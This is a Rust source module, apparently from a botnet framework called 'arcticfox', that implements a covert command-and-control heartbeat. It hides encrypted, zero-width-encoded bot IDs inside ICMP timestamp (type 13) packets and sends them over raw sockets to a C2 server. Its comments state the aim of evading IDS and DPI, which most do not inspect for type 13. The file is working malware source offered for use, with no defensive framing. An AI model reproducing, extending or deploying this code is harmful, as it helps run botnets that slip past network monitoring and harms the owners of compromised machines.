//! ICMP Timestamp ZW Heartbeat — Covert Channel via Type 13/14
//!
//! Uses ICMP timestamp requests (type 13) and replies (type 14) for
//! stealthy bot heartbeats. ICMP timestamp is FAR less monitored than
//! echo (type 8) — most IDS/DPI ignores type 13 entirely.
//!
//! Payload is encrypt-then-ZW-encode via seal_oneshot, embedded in the
//! ICMP data field after the timestamp header. Requires root/CAP_NET_RAW.
//!
//! Format: ICMP type 13 header (20 bytes) + seal_oneshot(bot_id)

use arcticfox_core::crypto::{generate_nonce, SESSION_KEY_LEN};
use arcticfox_zwtransport::seal_oneshot;
use std::net::Ipv4Addr;
use tracing::{debug, warn};

const ICMP_TSTAMP_TYPE: u8 = 13;
const ICMP_TSTAMP_REPLY: u8 = 14;

#[cfg(target_os = "linux")]
pub fn build_icmp_heartbeat(
    bot_id: &str,
    session_key: &[u8; SESSION_KEY_LEN],
    identifier: u16,
    sequence: u16,
) -> Option<Vec<u8>> {
    let nonce = generate_nonce();
    let zw_payload = seal_oneshot(session_key, &nonce, bot_id.as_bytes()).ok()?;

    let nonce_bytes = &nonce;
    let payload = format!("{}{}", hex::encode(nonce_bytes), zw_payload);
    let payload_bytes = payload.as_bytes();

    let mut packet = Vec::with_capacity(20 + payload_bytes.len());
    packet.push(ICMP_TSTAMP_TYPE);
    packet.push(0); // code
    packet.extend_from_slice(&[0x00, 0x00]); // checksum placeholder
    packet.extend_from_slice(&identifier.to_be_bytes());
    packet.extend_from_slice(&sequence.to_be_bytes());

    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default();
    let ms = (now.as_millis() % 86_400_000) as u32;
    packet.extend_from_slice(&ms.to_be_bytes());       // originate
    packet.extend_from_slice(&[0u8; 4]);                 // receive
    packet.extend_from_slice(&ms.to_be_bytes());         // transmit
    packet.extend_from_slice(payload_bytes);

    let checksum = icmp_checksum(&packet);
    packet[2] = (checksum >> 8) as u8;
    packet[3] = checksum as u8;

    Some(packet)
}

#[cfg(not(target_os = "linux"))]
pub fn build_icmp_heartbeat(
    _bot_id: &str,
    _session_key: &[u8; SESSION_KEY_LEN],
    _identifier: u16,
    _sequence: u16,
) -> Option<Vec<u8>> {
    None
}

/// Send an ICMP timestamp heartbeat to the C2 server.
/// Requires root or CAP_NET_RAW.
#[cfg(target_os = "linux")]
pub fn send_icmp_heartbeat(
    bot_id: &str,
    session_key: &[u8; SESSION_KEY_LEN],
    dest: Ipv4Addr,
    identifier: u16,
    sequence: u16,
) {
    let packet = match build_icmp_heartbeat(bot_id, session_key, identifier, sequence) {
        Some(p) => p,
        None => return,
    };

    let sock = match unsafe {
        libc::socket(
            libc::AF_INET,
            libc::SOCK_RAW,
            libc::IPPROTO_ICMP,
        )
    } {
        fd if fd >= 0 => fd,
        _ => {
            warn!("ICMP heartbeat: raw socket failed (need root)");
            return;
        }
    };

    let addr = libc::sockaddr_in {
        sin_family: libc::AF_INET as u16,
        sin_port: 0,
        sin_addr: libc::in_addr {
            s_addr: u32::from(dest).to_be(),
        },
        sin_zero: [0u8; 8],
    };

    unsafe {
        libc::sendto(
            sock,
            packet.as_ptr() as *const libc::c_void,
            packet.len(),
            0,
            &addr as *const _ as *const libc::sockaddr,
            std::mem::size_of::<libc::sockaddr_in>() as u32,
        );
        libc::close(sock);
    }

    debug!("ICMP heartbeat sent to {}", dest);
}

#[cfg(not(target_os = "linux"))]
pub fn send_icmp_heartbeat(
    _bot_id: &str,
    _session_key: &[u8; SESSION_KEY_LEN],
    _dest: Ipv4Addr,
    _identifier: u16,
    _sequence: u16,
) {
}

fn icmp_checksum(data: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    for chunk in data.chunks(2) {
        let word = if chunk.len() == 2 {
            (chunk[0] as u32) << 8 | chunk[1] as u32
        } else {
            (chunk[0] as u32) << 8
        };
        sum = sum.wrapping_add(word);
    }
    while sum >> 16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    !(sum as u16)
}

#[cfg(test)]
mod tests {
    use super::*;
    use arcticfox_core::crypto::generate_session_key;

    #[test]
    fn icmp_heartbeat_builds_valid_packet() {
        let key = generate_session_key();
        let packet = build_icmp_heartbeat("test-bot", &key, 0x1234, 0x0001);
        if let Some(p) = packet {
            assert_eq!(p[0], ICMP_TSTAMP_TYPE);
            assert!(p.len() >= 20);
        }
    }
}
